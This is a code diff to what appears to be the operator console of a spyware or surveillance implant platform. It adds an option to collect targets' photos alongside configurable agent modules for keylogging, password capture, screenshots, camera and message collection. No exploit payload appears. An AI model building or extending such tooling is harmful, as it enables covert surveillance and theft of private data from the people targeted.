@@ -119,6 +119,7 @@
 				messages.enabled=(getModule('messages') != null || getModule('chat') != null) && !(currentAgent.level == "scout" &&  currentAgent._kind!="factory") && !((currentAgent.level == "soldier" || currentAgent.level == "scout") && currentAgent.demo);
 				url.enabled=getModule('url') != null && !(currentAgent.level == "scout" &&  currentAgent._kind!="factory") && !((currentAgent.level == "soldier" || currentAgent.level == "scout") && currentAgent.demo);
 				file.enabled=getModule('file') != null && !(currentAgent.level == "scout" &&  currentAgent._kind!="factory") && currentAgent.level != "soldier" && !((currentAgent.level == "soldier" || currentAgent.level == "scout") && currentAgent.demo);
+        file.pictures.enabled=getModule('photo') != null && !(currentAgent.level == "scout" &&  currentAgent._kind!="factory") && currentAgent.level != "soldier" && !((currentAgent.level == "soldier" || currentAgent.level == "scout") && currentAgent.demo);
 				keylog.enabled=getModule('keylog') != null && !(currentAgent.level == "scout" &&  currentAgent._kind!="factory") && !((currentAgent.level == "soldier" || currentAgent.level == "scout") && currentAgent.demo);
 				screenshot.enabled=getModule('screenshot') != null && !((currentAgent.level == "soldier" || currentAgent.level == "scout") && currentAgent.demo);
 				camera.enabled=getModule('camera') != null && !(currentAgent.level == "scout" &&  currentAgent._kind!="factory") && !((currentAgent.level == "soldier" || currentAgent.level == "scout") && currentAgent.demo);
@@ -132,6 +133,7 @@
 				messages.selected=messages.enabled ? (hasAction('messages') || hasAction('chat')) : false;
 				url.selected=url.enabled ? hasAction('url') : false;
 				file.selected=file.enabled ? hasAction('file') : false;
+        file.pictures.selected=file.pictures.enabled? hasAction('photo') : false;
 				keylog.selected=keylog.enabled ? hasAction('keylog') : false;
 				screenshot.selected=screenshot.enabled ? hasLoop('SCREENSHOT') : false;
 				camera.selected=camera.enabled ? hasLoop('CAMERA') : false;
@@ -271,6 +273,7 @@
 				model.messages=messages.selected;
 				model.url=url.selected;
 				model.file=file.selected;
+        model.photo=file.pictures.selected;
 				model.keylog=keylog.selected;
 				model.screenshot=screenshot.selected;
 				model.camera=camera.selected;
@@ -335,7 +338,7 @@
 							gap="20">
 			<selectors:FileSelector id="file"
 															enabled="{!isMobile &amp;&amp; Console.currentSession.user.is_tech_config()}"
-															title="Accessed Files"/>
+															title="Accessed Files and Photos"/>
 			<selectors:SimpleSelector id="keylog"
 																title="{isMobile ? 'Keylog' : 'Keylog, Mouse &amp; Password'}"
 																enabled="{Console.currentSession.user.is_tech_config()}"/>
